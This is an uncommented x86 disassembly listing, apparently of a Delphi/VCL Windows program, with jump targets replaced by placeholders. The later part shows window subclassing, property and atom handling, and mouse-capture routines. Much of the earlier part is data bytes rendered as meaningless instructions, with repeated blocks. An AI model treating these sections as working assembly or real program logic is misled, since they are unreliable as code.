add [ edx + edx * 4 - 0x6d3fffbb ] ch
inc ebp
add [ edi + esi * 4 + 0x44 ] bh
add al ch
xchg edx eax
inc ebp
add al bl
mov bh 0x44
add al dh
xchg edx eax
inc ebp
add al bh
mov bh 0x44
add al bh
xchg edx eax
inc ebp
add al dl
in eax dx
inc esp
add ah ch
mov eax 0xb92c0044
inc esp
add [ eax ] bl
mov eax 0x930c0044
inc ebp
add [ eax ] dl
xchg ebx eax
inc ebp
add [ eax + edi * 4 ] bh
inc esp
add [ ebp + esi * 4 + 0x54150044 ] ch
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x8580c08b
inc esp
add [ ebx ] al
or [ ecx + ecx * 2 + 0x6d ] dl
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add [ ebp + eax * 4 + 0x44 ] bh
adc [ edi - 0x6da3ffbc ] dh
inc ebp
call sub_44c925
add [ eax + 0x480b0009 ] al
insb
jo r-xdata
add [ eax ] al
pop es
bound esp [ ebp + 0x54 ]
outsd
jo r-xdata
xchg [ eax + eax + 0x3 ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
add [ eax + 0x6004486 ] al
bound esp [ ebp + 0x4c ]
je r-xdata
add eax 0x0
xchg [ eax + eax + 0x6 ] al
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
or ch [ ecx + 0x6d ]
push ebx
dec eax
popad
outsb
jne r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x5bffbde9 ] bh
in eax dx
inc eax
dec eax
pop edx
inc ecx
add [ eax + 0x1 ] bl
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
add [ ebx ] al
add [ eax ] al
add ah bl
xchg [ eax + eax + 0x6 ] al
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
add [ esi ] al
jb r-xdata
dec esp
outsd
ja r-xdata
or [ edx + 0x76 ] esp
insb
or [ ecx + 0x6d ] ebp
dec eax
popad
outsb
jne r-xdata
add bh bh
add [ eax ] al
outsd
insb
jae r-xdata
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
add [ eax ] al
insb
inc ebp
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
or [ fs : edx + 0x76 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
or [ edx + 0x76 ] ah
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
xchg [ eax + eax + 0x6 ] al
mov [ eax + eax + 0x16 ] al
outsd
insb
jae r-xdata
mov eax eax
and al 0x87
inc esp
outsb
je r-xdata
inc ebx
outsd
xchg [ eax + eax - 0x75 ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
add [ esi - 0x3f74ffbc ] 0xe0
xchg [ eax + eax + 0x3 ] al
shl al 0x86
inc esp
add [ ebx ] al
add [ eax - 0x74ffbb7a ] eax
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
add [ ecx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
shl [ edi + eax * 4 ] 0x44
mov eax [ eax + eax + 0x4 ]
add al [ eax ]
add [ eax + eax * 4 + 0x16cc0044 ] cl
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] cl
out dx eax
inc esp
add al dl
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
inc ecx
add [ eax + 0x1c0044e9 ] al
mov ebp 0xf0ac0044
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
push ss
insb
push edi
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
outsd
insb
jae r-xdata
add [ ecx ] cl
imul ebp [ ebp + 0x44 ] 0x62617369
insb
pop es
imul ebp [ ebp + 0x43 ] 0x65736f6c
push es
imul ebp [ ebp + 0x4f ] 0xa6e6570
imul ebp [ ebp + 0x44 ] 0x43746e6f
popad
jb r-xdata
inc edx
outsd
jb r-xdata
rcl [ eax ] 0x86
inc esp
add [ edx ] cl
or [ ecx + ecx * 2 + 0x6d ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 4 - 0x74d7ffbc ] al
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
dec esi
popad
insd
mov eax eax
and [ esi + 0xc010044 ] al
push esp
or cl [ eax ]
push esp
dec ecx
insd
test [ esi + 0xa030044 ] al
push esp
inc edx
jbe r-xdata
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add al bl
in eax dx
inc esp
add ah ah
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
outsd
insb
jae r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x16004488 ] bl
add [ eax ] al
add [ eax ] al
test [ eax - 0x74d7ffbc ] cl
add bh bh
sub_4483d6
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060005 ] al
imul esp [ gs : edi + 0x68 ] 0x446fe474
add [ eax ] bh
add bh bh
or dl 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ esi ] al
inc ebx
jne r-xdata
push [ ecx + eax * 8 - 0x16dfffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
jae r-xdata
xor al 0x40
outsd
outsb
je r-xdata
add bh bh
mov ah 0xc1
inc esp
add [ eax ] ah
jmp r-xdata
jb r-xdata
add [ esp + edx * 2 ] ecx
or [ ecx + 0x6d ] ch
push ebx
inc ecx
insb
jo r-xdata
add [ eax + ebx ] al
inc edx
add [ eax + 0x18 ] bl
inc edx
add [ esi + esi * 4 - 0x6dcbffbc ] bl
js r-xdata
cld
add [ eax ] al
add [ ebx ] 0x0
add edx [ edi + ebp * 2 + 0x70 ]
cmp al 0x10
inc eax
add [ eax ] cl
add bh bh
or al al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
dec esp
add [ eax ] al
[ eax + eax * 8 ]
adc [ eax ] al
add [ eax ] 0x0
inc [ eax + 0xff0000 ]
jmp r-xdata
insb
inc ebp
jb r-xdata
je r-xdata
popad
pop es
imul ebp [ ebp + 0x41 ] 0x6168706c
push es
imul ebp [ ebp + 0x48 ] 0x7617269
imul ebp [ ebp + 0x53 ] 0x6174614b
push es
imul ebp [ ebp + 0x4b ] 0x9617461
imul ebp [ ebp + 0x43 ] 0x656e6968
jae r-xdata
add al cl
in eax dx
inc esp
add [ eax + 0x440044b8 ] cl
mov bh 0x44
add [ edx + edx * 4 - 0x6d3fffbb ] ch
inc ebp
add [ edi + esi * 4 + 0x44 ] bh
add al ch
xchg edx eax
inc ebp
add al bl
mov bh 0x44
add al dh
xchg edx eax
inc ebp
add al bh
mov bh 0x44
add al bh
xchg edx eax
inc ebp
add al dl
in eax dx
inc esp
add ah ch
mov eax 0xb92c0044
inc esp
add [ eax ] bl
mov eax 0x930c0044
inc ebp
add [ eax ] dl
xchg ebx eax
inc ebp
add [ eax + edi * 4 ] bh
inc esp
add [ ebp + esi * 4 + 0x54150044 ] ch
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x8580c08b
inc esp
add [ ebx ] al
or [ ecx + ecx * 2 + 0x6d ] dl
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add [ ebp + eax * 4 + 0x44 ] bh
adc [ edi - 0x6da3ffbc ] dh
inc ebp
call sub_44c925
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x480b0009 ] al
insb
jo r-xdata
pop es
bound esp [ ebp + 0x54 ]
outsd
jo r-xdata
xchg [ eax + eax + 0x3 ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
add [ eax + 0x6004486 ] al
bound esp [ ebp + 0x4c ]
je r-xdata
add eax 0x0
xchg [ eax + eax + 0x6 ] al
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
or ch [ ecx + 0x6d ]
push ebx
dec eax
popad
outsb
jne r-xdata
inc ebp
add [ eax ] dl
mov bh 0x44
add [ edx + edx * 4 + 0x45 ] bl
add [ edx + edx * 4 ] dh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
add al dh
xor al 0x40
add ah bh
add [ ebp + eax * 4 + 0x44 ] ah
add [ eax + eax ] ah
add [ eax ] al
pop esp
jne r-xdata
jns r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
add [ ebx ] al
add [ eax ] al
add ah bl
xchg [ eax + eax + 0x6 ] al
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
add [ esi ] al
jb r-xdata
dec esp
outsd
ja r-xdata
or [ edx + 0x76 ] esp
insb
or [ ecx + 0x6d ] ebp
dec eax
popad
outsb
jne r-xdata
inc esp
add ah ch
pop ss
inc edx
add [ eax + 0x200044b7 ] dh
sbb [ edx ] al
pop esp
mov eax 0x17700044
inc edx
outsd
jb r-xdata
add bh bh
add [ eax ] al
outsd
insb
jae r-xdata
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
add [ eax ] al
insb
inc ebp
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
or [ fs : edx + 0x76 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
or [ edx + 0x76 ] ah
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x5bffbde9 ] bh
in eax dx
inc eax
dec eax
pop edx
inc ecx
add [ eax + 0x1 ] bl
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
xchg [ eax + eax + 0x6 ] al
mov [ eax + eax + 0x16 ] al
outsd
insb
jae r-xdata
mov eax eax
and al 0x87
inc esp
outsb
je r-xdata
inc ebx
outsd
xchg [ eax + eax - 0x75 ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
add [ esi - 0x3f74ffbc ] 0xe0
xchg [ eax + eax + 0x3 ] al
shl al 0x86
inc esp
add [ ebx ] al
add [ eax - 0x74ffbb7a ] eax
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
add [ ecx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
shl [ edi + eax * 4 ] 0x44
mov eax [ eax + eax + 0x4 ]
add al [ eax ]
add [ eax + eax * 4 + 0x16cc0044 ] cl
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] cl
out dx eax
inc esp
add al dl
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
inc ecx
add [ eax + 0x1c0044e9 ] al
mov ebp 0xf0ac0044
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
push ss
insb
push edi
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
outsd
insb
jae r-xdata
add [ ecx ] cl
imul ebp [ ebp + 0x44 ] 0x62617369
insb
pop es
imul ebp [ ebp + 0x43 ] 0x65736f6c
push es
imul ebp [ ebp + 0x4f ] 0xa6e6570
imul ebp [ ebp + 0x44 ] 0x43746e6f
popad
jb r-xdata
inc edx
outsd
jb r-xdata
rcl [ eax ] 0x86
inc esp
add [ edx ] cl
or [ ecx + ecx * 2 + 0x6d ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 4 - 0x74d7ffbc ] al
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
dec esi
popad
insd
mov eax eax
and [ esi + 0xc010044 ] al
push esp
or cl [ eax ]
push esp
dec ecx
insd
test [ esi + 0xa030044 ] al
push esp
inc edx
jbe r-xdata
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add al bl
in eax dx
inc esp
add ah ah
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
outsd
insb
jae r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x16004488 ] bl
add [ eax ] al
add [ eax ] al
test [ eax - 0x74d7ffbc ] cl
add bh bh
sub_448be0
mov bl cl
inc esp
add al bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_449234
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc ebx
push 0x65676e61
add [ eax ] dl
inc eax
add [ edx ] al
add bh bh
inc edx
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or edx [ ebx + 0x68 ]
popad
jb r-xdata
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x9004032 ] bl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
dec ecx
insd
popad
jae r-xdata
add [ eax ] ch
add [ eax ] al
add [ eax - 0xfffbff0 ] dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax ] al
add [ edx + edx * 4 + 0x44 ] bh
adc [ eax ] al
xor al 0x0
add bh bh
sub_4493a9
xor al 0x40
add [ ecx + ebx * 2 + 0x59c00040 ] dh
inc eax
add [ esi + 0x34f80040 ] al
inc eax
add al dl
pop ecx
inc eax
add [ edx + esi + 0x40 ] bl
add ah bl
push esi
inc ebp
add [ eax ] dh
push edi
inc ebp
add [ eax - 0x47ffbaa8 ] ch
pop eax
inc ebp
add [ eax + 0x60 ] bh
inc ebp
add [ eax + 0x63 ] ah
inc ebp
add [ eax - 0x5bffba9b ] ah
inc ebp
add [ eax + 0x5c00456c ] ch
push 0x45
add [ ebp + edx * 2 + 0x45 ] dh
add [ esp ] bh
inc ebp
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jb r-xdata
add [ eax ] al
test al 0x95
inc esp
add [ eax ] al
mov eax eax
dec esp
xchg esp eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edx * 4 + 0x44 ] cl
add [ eax ] ch
add [ eax ] al
add [ eax - 0xfffbff0 ] dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x6004579 ] dl
push esp
dec ebp
outsd
jne r-xdata
adc eax [ edx ]
in al dx
push ss
inc edx
add al bl
in eax dx
inc esp
add ah ah
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x8004495 ] dl
add al [ eax ]
add [ eax - 0x79 ] dh
inc esp
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] cl
out dx eax
inc esp
add al dl
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
inc ecx
add [ eax + 0x1c0044e9 ] al
mov ebp 0xf0ac0044
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
nop
mov al [ 0x4494 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4495 ] ch
sub_4495e8
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_4496a0
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_4496d4
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4044f8
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_4496a0
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_449730
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_449914
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c6b4
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_404558
mov eax edi
mov edx esi
call sub_40408c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_449958
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c6b4
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_404558
mov eax edi
mov edx esi
call sub_40408c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44999c
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
add eax [ esi + 0x44 ]
push eax
mov eax [ esp + 0x8 ]
add eax [ esi + 0x40 ]
push eax
push ebx
call SetWindowOrgEx
mov eax ebx
push eax
mov ecx eax
mov edx 0x14
mov eax [ esi + 0x30 ]
call sub_44da78
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop esi
pop ebx
retn
sub_449a18
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
mov eax ebx
call sub_4530b8
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_449ac4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_4188d4
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_449af8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4530b8
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_449b20
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026cc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_449af8
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_449ac4
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_418778
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_418950
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_449b7c
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_4187ac
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4188d4
mov edx 0x8
call sub_4026ec
inc esi
dec ebx
jne r-xdata
sub_449bb0
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_4188d4
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_449ac4
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_449c14
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_449c74
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4031f8
mov edx esp
mov eax esi
call sub_40429c
add esp 0x100
pop esi
pop ebx
retn
sub_449cb0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_449d7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_44add4
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_44a75c
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406d24
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_44a75c
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_44add4
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_44a75c
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_44add4
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_449d7f
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46d0dc
call sub_403af0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_44add4
sub_449dd8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_449e02
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_449e6c
push ebx
